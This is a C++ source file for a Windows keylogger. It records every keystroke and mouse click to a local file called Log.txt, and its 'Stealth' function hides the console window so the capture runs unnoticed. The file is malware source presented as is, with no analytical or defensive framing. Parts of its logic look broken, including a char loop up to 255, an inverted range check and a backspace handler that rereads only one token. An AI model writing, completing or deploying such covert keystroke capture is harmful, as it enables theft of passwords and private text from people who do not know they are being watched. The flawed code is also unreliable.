#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>
#include <string>

using namespace std;

void BackSpace() {
	std::string contents;

	std::ifstream oldfile("Log.txt");	//open log file
	oldfile >> contents;
	oldfile.close();	//close log file

	contents.pop_back();	//delete last character from the log file

	std::ofstream newfile("Log.txt", std::ios::trunc);	//Opening and clearing the file
	newfile << contents;
	newfile.close();	//close log file
	
}

// Log Driver Block
void Log() {
	
	char key;
	while (true)
	{
		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767)
			{
				ofstream write("Log.txt", ios::app);
				if (((key>64)&& (key<91)) && !(GetAsyncKeyState(0x10))){
					key += 32;
					write << key;
					write.close();
					break;
				}
				else if( (key>64) && (key>91) ) {
					write << key;
					write.close();
					break;
				}
				else {
					switch (key) {
					case VK_LBUTTON:
						write << "<Click>";
						break;
					case VK_CAPITAL:
						if (key > 64 && key < 91) {
							write << key;
						}
						break;
					case 8:
						BackSpace();
							break;
					case 9: write << "	";
							break;
					case 13: write << "\n";
							break;
					case 27: write << "<ESC>";
						break;
					case 32: write << " ";
						break;
					case 48:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << ")";
						}
						else
						{
							write << "0";
						}
						break;
					case 49:
						if ( GetAsyncKeyState(VK_SHIFT) ) {
							write << "!";
						}
						else {
							write << "1";
						}
						break;
					case 50:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << "@";
						}
						else {
							write << "2";
						}
						break;
					case 51:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << "#";
						}
						else {
							write << "3";
						}
						break;
					case 52:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << "$";
						}
						else {
							write << "4";
						}
						break;
					case 53:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << "%";
						}
						else {
							write << "5";
						}
						break;
					case 54:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << "^";
						}
						else {
							write << "6";
						}
						break;
					case 55:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << "&";
						}
						else {
							write << "7";
						}
						break;
					case 56:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << "*";
						}
						else {
							write << "8";
						}
						break;
					case 57:
						if (GetAsyncKeyState(VK_SHIFT)) {
							write << "(";
						}
						else {
							write << "9";
						}
						break;
					case 254: write << "CLICK";
						break;
					default:
						write << key;
					}
				}
				
			}
		}
	}
}
void Stealth() {
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
	Log();
}
//Main Body
int main() {
	Stealth();
	return 0;

}